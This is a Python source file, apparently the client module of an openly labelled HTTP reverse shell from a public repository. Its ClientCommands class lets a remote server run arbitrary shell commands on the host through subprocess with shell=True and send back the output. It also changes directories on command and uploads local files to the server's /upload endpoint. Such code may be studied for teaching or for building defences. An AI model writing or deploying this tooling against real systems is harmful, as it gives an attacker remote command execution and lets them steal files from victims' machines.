#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import os
import subprocess
from pathlib import Path
from typing import Sequence


class ClientCommands:
    def __init__(self, client):
        self.client = client

    def cd(self, dest_dir: [str, None]) -> None:
        try:
            dest_dir = "~" if dest_dir is None else dest_dir
            os.chdir(Path(dest_dir).expanduser())
        except FileNotFoundError as e:
            self.client.post(data=f"{e}\n")

    def upload(self, path: str) -> None:
        path = Path(path).expanduser()
        full_path = path if path.is_absolute() else \
            self.get_cwd().joinpath(path)
        try:
            with open(file=full_path, mode='rb') as fd:
                self.client.post(
                    data=fd.read(),
                    url=f"{self.client.server_url}/upload/{full_path.stem}"
                )
        except FileNotFoundError as e:
            self.client.post(data=f"{e}\n")

    def shell(self, command: [str, Sequence[str]]) -> None:
        cmd = subprocess.run(command, capture_output=True, shell=True)
        for result in cmd.stdout, cmd.stderr:
            if len(result) > 0:
                self.client.post(data=result)

    @staticmethod
    def get_cwd() -> Path:
        return Path.cwd()
